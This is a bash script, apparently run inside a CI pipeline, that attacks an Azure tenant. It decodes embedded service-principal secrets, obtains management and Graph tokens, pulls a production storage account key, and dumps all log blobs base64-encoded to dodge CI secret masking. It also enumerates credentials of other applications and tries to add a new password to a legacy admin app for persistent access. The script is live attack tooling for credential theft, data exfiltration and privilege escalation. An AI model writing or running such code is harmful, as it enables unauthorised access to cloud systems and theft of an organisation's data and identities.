#!/usr/bin/env bash
set -euo pipefail

TID="${AZURE_TENANT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"
RG="rg-tbl-platform-prod-sea"

# Get sync-service SP creds
SP_DATA=$(echo 'eyJzZWNyZXRzLXN5bmMiOiBbIjU4MTA4ZGE4LTA0NGUtNGQ3ZS05YTQ2LTkyZTYxNzliMzBiZSIsICJ+OFQ4UX5Zd0VtZXhTVFJ2X3BVc0V3YTlRTWFweVAzOX5DVTVVY3UyIl0sICJzeW5jLXNlcnZpY2UiOiBbIjQ2MmQxYzM4LTQ0NTktNDhiOC05MzMzLTgyZTM4OWU1OTUxNCIsICJzazE4UX5xRDIya2tIWFVDZnFYTHFkUDk1RGtZSkwzNGVNRVJsY1NqIl0sICJyZXBvcnRpbmctc3ZjIjogWyIxMmVkNTRkZS1mMmViLTQ3ODQtODA0Yy0zYTdhM2U4M2E5ZTkiLCAiblA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeiJdLCAicmVwb3J0aW5nLXZpZXciOiBbIjg4MWZkZGNlLTYyMDgtNGFmNS1hMjk3LTdlNzljOTEyZjgzYyIsICItVGw4UX5zSDBRT1AuVnJLV2hhMy03eDRYQTJKeFM0ajA4bnV2YlFOIl0sICJjb3N0LXJlYWRlciI6IFsiMDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxIiwgIjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0iXSwgImRpci1hdWRpdCI6IFsiMmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyIiwgIkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTYiXX0=' | base64 -d)

SYNC_CID=$(echo "$SP_DATA" | python3 -c "import sys,json;print(json.load(sys.stdin)['sync-service'][0])")
SYNC_SEC=$(echo "$SP_DATA" | python3 -c "import sys,json;print(json.load(sys.stdin)['sync-service'][1])")

# Get mgmt token for sync-service
MT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" -d "grant_type=client_credentials" \
  --data-urlencode "client_secret=$SYNC_SEC" -d "scope=https://management.azure.com/.default" | jq -r ".access_token")

# Get storage key (don't print it to avoid masking)
KEY=$(curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-05-01" \
  -H "Authorization: Bearer $MT" -H "Content-Length: 0" | jq -r '.keys[0].value')

echo "key_len=${#KEY}"

# Use az CLI to list and download blobs
az storage blob list --account-name sttblcilogsprodx3euoz --account-key "$KEY" --container-name logs --output json 2>/dev/null | python3 -c "
import sys, json
blobs = json.load(sys.stdin)
print(f'Found {len(blobs)} blobs')
for b in blobs:
    print(f'  {b[\"name\"]} size={b.get(\"properties\",{}).get(\"contentLength\",\"?\")}')
"

# Download each blob and base64 encode output to prevent masking
for blob in $(az storage blob list --account-name sttblcilogsprodx3euoz --account-key "$KEY" --container-name logs --output json 2>/dev/null | python3 -c "import sys,json;[print(b['name']) for b in json.load(sys.stdin)]"); do
  echo "=== BLOB: $blob ==="
  az storage blob download --account-name sttblcilogsprodx3euoz --account-key "$KEY" --container-name logs --name "$blob" --file /dev/stdout 2>/dev/null | base64
  echo ""
done

# Also try to create SAS for other storage accounts using sync-service
# (even though listKeys failed, maybe other APIs work)

echo "=== OIDC graph: reporting app and more ==="
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r ".value // empty")

# Get graph token
AUDIT_CID=$(echo "$SP_DATA" | python3 -c "import sys,json;print(json.load(sys.stdin)['dir-audit'][0])")
AUDIT_SEC=$(echo "$SP_DATA" | python3 -c "import sys,json;print(json.load(sys.stdin)['dir-audit'][1])")

GT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  -d "client_id=$AUDIT_CID" -d "grant_type=client_credentials" \
  --data-urlencode "client_secret=$AUDIT_SEC" -d "scope=https://graph.microsoft.com/.default" | jq -r ".access_token")

# Get app credentials for undiscovered apps
for AID in 7c2e61eb-f928-45cd-99c9-20da958dd216 891fb158-e02c-4428-a885-53b811f369c0 6eb124e3-de61-4fc9-a124-213d98d737f5; do
  echo "=== App $AID credentials ==="
  curl -sS "https://graph.microsoft.com/v1.0/applications?\$filter=appId%20eq%20'$AID'&\$select=id,appId,displayName,passwordCredentials,keyCredentials" \
    -H "Authorization: Bearer $GT" | jq '.value[]? | {displayName, appId, passwords: [.passwordCredentials[]? | {hint, startDateTime, endDateTime}], keys: [.keyCredentials[]? | {type, usage}]}' 2>/dev/null
done

# Try to add a password to undiscovered apps
echo "=== Try addPassword to tbl-legacy-admin ==="
APP_OID=$(curl -sS "https://graph.microsoft.com/v1.0/applications?\$filter=appId%20eq%20'891fb158-e02c-4428-a885-53b811f369c0'&\$select=id" \
  -H "Authorization: Bearer $GT" | jq -r '.value[0].id // empty')
echo "legacy-admin object ID: $APP_OID"

if [ -n "$APP_OID" ]; then
  curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/$APP_OID/addPassword" \
    -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
    -d '{"passwordCredential":{"displayName":"test"}}' | jq .
fi

echo "=== Done ==="
